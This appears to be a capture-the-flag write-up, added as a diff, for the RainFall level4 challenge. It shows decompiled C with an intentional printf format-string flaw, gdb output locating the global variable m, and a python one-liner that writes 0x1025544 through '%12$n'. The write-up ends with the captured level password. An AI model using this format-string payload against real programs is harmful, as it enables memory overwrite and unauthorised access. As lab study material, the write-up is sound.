@@ -1,0 +1,106 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int m = 0;
+
+void p(char *param_1) {
+    printf(param_1);
+}
+
+void n(void) {
+    char local_20c[520];
+    
+    fgets(local_20c, 0x200, stdin);
+    
+    p(local_20c);
+    
+    if (m == 0x1025544) {
+        system("/bin/cat /home/user/level5/.pass");
+    }
+}
+
+int main(void) {
+    n();
+    return 0;
+}
+
+lets anayleze the code, the main do the n then the n gets our input and then goes to p and then p do exactly the same printf vulnerabily, now the only difference is the number, we are comparing against, 
+
+0x1025544,
+this is decimal is 
+16930116
+
+is a big number, to big in fact that overpass our 0x200 limit in the fgets
+
+so how can we put in the buffer 16930116 that much numbers without having to write them down literaly, 
+
+easy lets learn a new flag
+
+the printf is desing to help to print stuff, so in our documents and language we got a bunchh of times where we need to put spaces at the beginin, like this 
+
+
+this is a text
+    this is a spaced text
+    this is a spaced text2j
+    maybe i want to try something different
+
+if we would print that we would had to do something like this,
+
+printf("    this is a spaced text");
+
+and the same for the other ones
+
+but here comes the printf utils, or quality of life flags that let us do that without having to worry about put '      ' every time we ant to put something, so lets take a look how to use the flag
+
+printf(%10d, 42)
+and the result
+
+'          42'
+so yeah, lets use that with out dollar and n flags to acomplish this
+
+lets explore the stack first, 
+
+"level4@RainFall:~$ ./level4 
+aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078"
+
+as we can see we are getting an offset of 12
+
+so lets check the globar var adress
+
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+0x08048588  _fp_hw
+0x0804858c  _IO_stdin_used
+0x080486f8  __FRAME_END__
+0x080496fc  __CTOR_LIST__
+0x080496fc  __init_array_end
+0x080496fc  __init_array_start
+0x08049700  __CTOR_END__
+0x08049704  __DTOR_LIST__
+0x08049708  __DTOR_END__
+0x0804970c  __JCR_END__
+0x0804970c  __JCR_LIST__
+0x08049710  _DYNAMIC
+0x080497dc  _GLOBAL_OFFSET_TABLE_
+0x080497fc  __data_start
+0x080497fc  data_start
+0x08049800  __dso_handle
+0x08049804  stdin@@GLIBC_2.0
+0x08049808  completed.6159
+0x0804980c  dtor_idx.6161
+0x08049810  m
+
+
+as we can see the m is 0x08049810
+
+lets bulid the payload
+
+08 04 98 10
+\x08\x04\x98\x10
+
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' > payload
+and we get the password
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
